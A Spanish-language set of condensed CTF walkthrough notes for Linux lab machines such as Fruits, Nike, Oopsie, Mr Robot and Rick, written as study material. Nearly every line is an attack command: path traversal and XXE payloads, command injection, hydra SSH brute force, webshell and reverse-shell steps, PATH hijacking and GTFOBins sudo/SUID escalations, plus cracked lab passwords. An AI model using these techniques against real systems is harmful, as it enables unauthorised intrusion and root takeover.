---
tags:
  - Walkthroughs
---
# Walkthroughs — Linux y servicios

Basado en tus apuntes, con los comandos normalizados y algún añadido para que se entienda.
`[?]` = dato dudoso de la transcripción (verifícalo contra la máquina).

## Fruits (THL)
- `netdiscover -r 192.168.18.0/24`; `nmap -sCV -Pn --min-rate=5000 <ip> -oA fruits`
- `dirsearch -u http://<ip> -w ...` → `/fruits.php`
- LFI: `/fruits.php?search=../../../../../etc/passwd`; fuzz `wfuzz -c -hl=1 -w ...`
- `?file=/etc/passwd` → `bananaman`; `hydra -l bananaman -P rockyou.txt ssh://<ip>` → `celtic`
- **Escalada:** `sudo -l` → `/usr/bin/find` → `sudo find . -exec /bin/sh \; -quit`

## Nike (THL)
- `dirsearch` → `/upload.php` (**XXE**)
- `xxe SYSTEM "php://filter/convert.base64-encode/resource=datos.php"` → decodificar
- hydra → `ssh mike@ip` (rbash) → `ssh mike@192.168.18.105 bash`
- `sudo -l` → `/usr/bin/java` (GTFOBins) → `sudo -u <user> java shell.java`
- A pylon: `echo 'import os; os.system("/bin/bash -i")' > suma.py`; `sudo -u pylon /usr/bin/python3 /opt/suma.py`
- **SUID backup.sh:** `chattr -i /usr/local/bin/backup.sh`; `echo "chmod +s /bin/bash" >> backup.sh`; `/bin/bash -p`

## Castor (THL)
- `dirsearch` → `/upload.php` → **XXE**:
  ```xml
  <!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <root><data>&xxe;</data></root>
  ```
- user → password con hydra → `ssh`
- **Escalada:** `sudo -l` → `sed` (GTFOBins)

## El Banco (THL) — 22, 80
- Botón de descarga → Burp → `archivo=../../../../../../etc/passwd` → `wwwperez`[?]
- `/config.php` → `archivo=../dbsupersecretinfo.json` → credencial SSH
- **Cadena lateral:**
  - `shark`: sobrescribir `bof` (`echo "bash -i" > bof`) → `sudo -u wuveret /home/shark/bof`
  - `wuveret`: `rubiales.zip` → `zip2john` → `john` → `princess` → `unzip` → users/passwords → `hydra` → `loseet`
  - `loseet`: `rubiales.py` usa `psutil` → secuestro `$PATH` → `vi psutil.py` (`import os; os.system("/bin/bash")`)
  - `username3`: `sudo -u root /usr/bin/bash`

## Oopsie (HTB) — 80, 22
- Burp → `/cdn-cgi/login` → guest; IDOR `?id=1`; manipular cookie `role`/`user` → admin
- Subir webshell → `user.txt`; `linpeas` (http.server + curl)
- `find -group bugtracker 2>/dev/null` → `/usr/bin/bugtracker`
- Secuestro `$PATH`: `cd /tmp`; `cat` malicioso; `export PATH=/tmp:$PATH`; `/usr/bin/bugtracker`
- Estabilizar: `python3 -c "import pty; pty.spawn('/bin/bash')"`; `stty raw -echo; fg`; `export TERM=xterm-256color`

## Mr Robot (THM) — 80, 443
- `dirsearch` → `/wp-login`, `/robots.txt` → `fsocity.dic`, `key-1-of-3.txt`
- `sort fsocity.dic | uniq > clean.txt`; fuerza bruta WP (Burp)
- Plugin → editor de tema → `404.php` como reverse → `nc -lvnp 4444`
- `su robot` (md5 crackeado) → key-2
- `find / -perm -4000 -type f 2>/dev/null` → `nmap` SUID → GTFOBins → root

## Rick (THM) — 21, 22, 80, 9090, 13337, 22222, 60000
- FTP 21 anónimo → `FLAG.txt`
- HTTP 80 → `/passwords/passwords.html` → `winter`
- `/tracertool.cgi` → `; head -n200 /etc/passwd` → usuarios
- Puerto 60000: `nc ip 60000` → `ls` → FLAG
- **ssh 22222:** `ssh Summer@ip -p 22222` (`winter`)
  - `/home/Morty`: `head -n100 safe_password.jpg` → `Meeseek`; `journal.txt.zip` (vía `scp`) → `131333`
  - `hydra -l RickSanchez -P passwords.txt ssh://ip:22222` → `P7Curtains`; `sudo su`

## Inject Crew (THL)
- `dirsearch` → `login.php`, `backup.php`; creds en `PwnedCredentials.html`[?] → CrackStation → `qwerty`
- usuario de `/etc/passwd` → `hydra -l <user> -P rockyou.txt ssh://ip`
- **Escalada:** `sudo -l` → `sudo find . -exec /bin/bash \; -quit`

## Pylon (THL)
- `sudo -l` → `logrotate` (GTFOBins) → escalada compleja vía logrotate
